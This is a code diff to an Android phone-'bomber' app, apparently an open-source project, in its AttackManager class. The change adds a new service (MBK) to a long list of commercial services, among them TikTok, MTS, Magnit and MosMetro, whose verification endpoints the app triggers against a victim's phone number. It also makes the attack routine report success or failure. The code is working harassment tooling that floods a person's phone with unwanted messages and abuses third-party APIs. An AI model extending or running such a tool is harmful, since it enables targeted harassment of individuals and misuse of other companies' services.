@@ -38,6 +38,7 @@ import com.dm.bomber.services.InDriver;
 import com.dm.bomber.services.Kari;
 import com.dm.bomber.services.KazanExpress;
 import com.dm.bomber.services.Lenta;
+import com.dm.bomber.services.MBK;
 import com.dm.bomber.services.MFC;
 import com.dm.bomber.services.MTS;
 import com.dm.bomber.services.Magnit;
@@ -151,7 +152,7 @@ public class AttackManager {
                 new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
                 new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
                 new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
-                new TikTok()
+                new TikTok(), new MBK()
         };
     }
 
@@ -181,7 +182,7 @@ public class AttackManager {
     }
 
     public interface Callback {
-        void onAttackEnd();
+        void onAttackEnd(boolean success);
 
         void onAttackStart(int serviceCount, int numberOfCycles);
 
@@ -219,26 +220,34 @@ public class AttackManager {
 
                 for (Service service : usableServices) {
                     service.prepare(phoneCode, phone);
-                    service.run(new okhttp3.Callback() {
-                        @Override
-                        public void onFailure(@NotNull Call call, @NotNull IOException e) {
-                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
 
-                            tasks.countDown();
-                            callback.onProgressChange(progress++);
-                        }
+                    try {
+                        service.run(new okhttp3.Callback() {
+                            @Override
+                            public void onFailure(@NotNull Call call, @NotNull IOException e) {
+                                Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
 
-                        @Override
-                        public void onResponse(@NotNull Call call, @NotNull Response response) {
-                            if (!response.isSuccessful()) {
-                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
-                                        service.getClass().getName(), response.code()));
+                                tasks.countDown();
+                                callback.onProgressChange(progress++);
                             }
 
-                            tasks.countDown();
-                            callback.onProgressChange(progress++);
-                        }
-                    });
+                            @Override
+                            public void onResponse(@NotNull Call call, @NotNull Response response) {
+                                if (!response.isSuccessful()) {
+                                    Log.i(TAG, String.format("%s returned an error HTTP code: %s",
+                                            service.getClass().getName(), response.code()));
+                                }
+
+                                tasks.countDown();
+                                callback.onProgressChange(progress++);
+                            }
+                        });
+                    } catch (StringIndexOutOfBoundsException e) {
+                        callback.onAttackEnd(false);
+
+                        Log.i(TAG, "Invalid number format");
+                        return;
+                    }
                 }
 
                 try {
@@ -248,7 +257,7 @@ public class AttackManager {
                 }
             }
 
-            callback.onAttackEnd();
+            callback.onAttackEnd(true);
             Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
         }
     }
